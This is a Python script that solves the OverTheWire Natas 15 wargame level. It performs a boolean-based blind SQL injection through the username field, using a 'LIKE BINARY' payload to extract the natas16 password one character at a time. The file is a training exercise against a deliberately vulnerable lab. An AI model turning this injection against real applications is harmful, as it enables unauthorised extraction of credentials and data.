import requests
import re

characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

username = "natas15"
password = "[PW_HERE]"

url = "http://natas15.natas.labs.overthewire.org"

session = requests.Session()

current_password = list()

while(True):
 for character in characters:
     print("Trying with: " + "".join(current_password) + character)
     response = session.post(url, data={"username": 'natas16" AND password LIKE BINARY "' + "".join(current_password) + character + '%" #'},auth=(username, password))
     if "This user exists." in response.text:
      current_password.append(character)
      break
 if len(current_password) == 32:
  break
